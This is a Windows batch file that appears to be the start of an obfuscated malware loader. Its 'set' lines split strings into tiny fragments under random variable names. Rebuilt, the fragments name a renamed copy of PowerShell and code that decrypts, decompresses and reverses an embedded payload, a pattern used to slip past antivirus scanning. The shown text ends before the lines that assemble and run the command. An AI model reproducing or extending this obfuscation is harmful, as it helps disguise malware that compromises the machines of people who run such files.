@echo off
set "QGTrBdzbTl=we"
set "XlbWDOhbsM=em"
set "krfQmYHlWm=we"
set "QpLvDOTzeG=32"
set "UyApXhZKxq=ws"
set "clejNZjvqV=:\"
set "uliZvmzVWN=do"
set "jPlrzmQTvx=\W"
set "sIISIHIWEX=.e"
set "BkrACOXFWg=st"
set "mEyXdBmAMm=Sy"
set "HvhqaHDKSs=py"
set "hgviArmczg=1."
set "XTTjcnfTzo=po"
set "msDlqNBSKZ=ll"
set "NemgKbDCto=in"
set "gtNeCnjEXb=Wi"
set "rOUuLnmlfm=he"
set "YLOamCOuhk=co"
set "tswhivqXDa=ow"
set "exnPWvjvYa= C"
set "WAZExBxYeQ=nd"
set "zOOkDcqYtJ=\v"
set "bTecqgEmaJ=he"
set "QnWGZXMZGS= /"
set "tukmcSKCeY=0\"
set "XnGVYLcELC=Po"
set "qpkWFfDBhL=rs"
set "DKQisIfbMe=y "
set "xitXlLKinI=s\"
set "NVWHCpEWjC=rS"
set "jVkuDDsKcZ=ll"
set "KDMOWbLzFo=xe"
set "pLNIyXXCsW=cd"
set "YXTSCsEirS= %~dp0"
set "fNtKQaGJjk=e]::"
set "pvvQdhiRhp=KwTc"
set "dFmioZfXWz=Mode"
set "IBfLDFFXEI=oArr"
set "AaIdFbNFRH=y]::"
set "hitACqSToe= [Sy"
set "aaBKjxcRkQ=;$Jq"
set "qXJIJlDsjf=('da"
set "AyaaoKVtly=Disp"
set "reqknxhqca== $S"
set "EGDmRCVMWx=tryP"
set "hJAdnlPjlG='')("
set "hYqVDNZFVP=New-"
set "echDVAYzdU=g = "
set "DgRKpDnMoB=SsDZ"
set "fugcVJXzPj=TllA"
set "voSnChGXxI=mory"
set "HIQsmvUAgE=onve"
set "pNTDduxpYM=n = "
set "dFEYwZsoIl=EZoq"
set "VvHAGrZxwI=] -j"
set "NQVWmownSM=tem."
set "ejmAcoaGXd=.Sec"
set "ddPAyadGGo=oL'["
set "UCcFtymuCD=);$V"
set "oenpIhkNNi=vert"
set "PtjVqwGzVz=736u"
set "uXQuIAbONf=tHA "
set "pLJNdVnFSo=ose("
set "bUBWFhAACq=$Mft"
set "VJlKIyyzVI= '')"
set "tXOxgnDskR=yste"
set "zvlGxgMYYb=, $E"
set "eFGMgrJXJO=gMod"
set "hyTikptxYy=ay()"
set "ERqwWoWKAs=1..-"
set "UMLPUyLCgh=ct S"
set "RZfZxjBjYZ= = $"
set "AKbCuoFJaA=-nop"
set "eCYyoZtwfF=);$K"
set "rUzVrIRONw=Fo7l"
set "gmGSwKndml=tem."
set "qwOteOMjEI=VXI "
set "mLHqOYgFJo=rofi"
set "duWziVfUxq=oin "
set "HQksyRsXCi=]::C"
set "wZroYFKJXN=();$"
set "SPlwiDWfrL=ne);"
set "fRDHpcdwJt===')"
set "FtQbUFHDnP=; };"
set "sgfEJoqDpX=qn ="
set "XINSbcwcdJ=null"
set "OGqszQDFpe=6esa"
set "iRKctndaAE=Dy.T"
set "zQVoqrFxzm=Comp"
set "pPgdpiaiYO=.Cre"
set "iydpLZSEnn=roNF"
set "QZKwdyKWck=orF'"
set "bwyOTbxzWL=oryS"
set "akAoptxPBX=ment"
set "qzSYJKXGmp=-joi"
set "fSKdKlPYBh='[-1"
set "HxbOahpOSY=();$"
set "GZEksJmGtj= = $"
set "qeJJgjvRWE=F'[-"
set "LTQmeVObBx=tS46"
set "ErOpuddjYj=JqVX"
set "dpZuPvNuts=ress"
set "OLsrYclSTu=$odb"
set "kbuWXUnUMR=.Dis"
set "NFXeuHuYBq=gth)"
set "AdRGBxwEQE=saBm"
set "GKBWrSVWAN=  $I"
set "EGJbPZcrER=[Sys"
set "rOspHMMbiw=m(, "
set "EycOpRtdVN=Obje"
set "YSkBfUjAyd=n, 0"
set "jYbPLdWyYO=lRWB"
set "MqiMlFjZbS=tsWi"
set "GHaxEwzlJA=qn);"
set "WHeTVNICUe=-1.."
set "hTcFEbIwnt=TcL "
set "JQPdSWgwiT=ck($"
set "BZmDWdOOLo=-4] "
set "PvYBLHqHia=comm"
set "FXhnoGsDhY= = ["
set "sYQvYFGHNT=stem"
set "PmVIlBllmT=rity"
set "FzeheYkyKb=urit"
set "rXzZkISPRK=tem."
set "qTsUcsGclS=Conv"
set "qXtmWeYuqG=]::N"
set "DfQWoLAXwd=pDZz"
set "XoanikfZRE=ress"
set "OfpSscwstZ=;$od"
set "pvrAvhOtrp=Dy ="
set "DayeDdQmEv=)($E"
set "IlsrRMVGng=Disp"
set "waZTEegXjQ=m.IO"
set "QwpcdzlpBH=..-1"
set "pSVhnIoxke=$KXv"
set "ayxuAIOMHV=embl"
set "UfSUXWrRel=6] -"
set "ZhjEMkUimz=7Yiv"
set "CInHTfnUdS=pose"
set "SkPrNREthJ=$roN"
set "QdgCNpIHHN=iron"
set "drSBXKYBRd== [S"
set "Bsbwfkafhb=).Sp"
set "UtmYNrpzGu=sDZF"
set "acRQfALWdt=($Kw"
set "vlFvkrVceq=[Sys"
